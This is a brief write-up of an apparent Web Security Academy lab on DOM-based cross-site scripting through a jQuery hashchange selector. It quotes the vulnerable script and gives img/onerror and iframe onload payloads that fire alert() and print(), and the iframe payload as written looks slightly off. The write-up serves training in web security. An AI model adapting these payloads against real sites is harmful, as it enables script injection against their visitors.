## Challenge explaining

ViewSource website to see this code 
                        `$(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });`

At this script, if value decoded with h2 validated -> page will be scroll to this header.
example: https://0a25003704812defc2f370c400d100ed.web-security-academy.net/#Finding%20Inspiration

-> so change the text fragment to html code `https://0a25003704812defc2f370c400d100ed.web-security-academy.net/#<img%20src=x%20onerror=alert(1)>`
-> trigger payload.

## Solution
to solve challenge, need to triiger *print()* function in victim browser.
payload using: `<iframe src="https://0ae500dd04d979e4c374a390009a00f6.web-security-academy.net/" onload ="this.src=this.src+ '<img src=x onerror=print()>'">`
explain: that payload will be put in request body, when victim load exploit url -> src will be run + payload img (as fragment above)